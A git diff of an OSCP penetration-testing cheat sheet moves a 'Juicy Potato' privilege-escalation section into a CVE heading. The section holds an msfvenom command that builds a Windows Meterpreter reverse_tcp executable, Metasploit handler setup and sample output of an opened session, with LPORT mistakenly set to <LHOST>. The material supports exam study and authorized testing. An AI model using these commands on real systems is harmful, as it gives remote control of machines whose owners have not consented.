@@ -94,8 +94,9 @@ Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/h
 		- [PowerShell](https://github.com/0xsyr0/OSCP#powershell)
 		- [Windows Tasks & Services](https://github.com/0xsyr0/OSCP#windows-tasks--services)
 		- [Writeable Directories in Linux](https://github.com/0xsyr0/OSCP#writeable-directories-in-linux)
-        - [CVE](https://github.com/0xsyr0/OSCP#cve)
-                - [SharpEfsPotato](https://github.com/0xsyr0/OSCP#sharpefspotato)
+	- [CVE](https://github.com/0xsyr0/OSCP#cve)
+		- [Juicy Potato](https://github.com/0xsyr0/OSCP#juicy-potato)
+		- [SharpEfsPotato](https://github.com/0xsyr0/OSCP#sharpefspotato)
 	- [Payloads](https://github.com/0xsyr0/OSCP#payloads-1)
 		- [Reverse Shells](https://github.com/0xsyr0/OSCP#reverse-shells)
 		- [Web Shells](https://github.com/0xsyr0/OSCP#web-shells)
@@ -1700,20 +1701,6 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 243             target = self.__kdcHost
 ```
 
-#### Juicy Potato
-
-```c
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b "\x00\x0a" -a x86 --platform windows -f exe -o exploit.exe
-
-msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set LHOST <LHOST>
-msf6 exploit(multi/handler) > set LPORT <LHOST>
-msf6 exploit(multi/handler) > run
-
-.\exploit.exe
-```
-
 #### PowerShell
 
 ##### General Usage
@@ -1918,6 +1905,33 @@ wmic qfe get Caption,Description,HotFixID,InstalledOn    # no new patches - KEXP
 ```
 
 ### CVE
+
+#### Juicy Potato
+
+> https://github.com/ohpe/juicy-potato
+
+##### msfvenom and Metasploit Execution
+
+```c
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b "\x00\x0a" -a x86 --platform windows -f exe -o exploit.exe
+```
+
+```c
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST <LHOST>
+msf6 exploit(multi/handler) > set LPORT <LHOST>
+msf6 exploit(multi/handler) > run
+```
+
+```c
+C:\> .\exploit.exe
+```
+
+```c
+[*] Sending stage (175174 bytes) to <RHOST>
+[*] Meterpreter session 1 opened (<LHOST>:<LPORT> -> <RHOST>:51990) at 2021-01-31 12:36:26 +0100
+```
 
 #### SharpEfsPotato
 
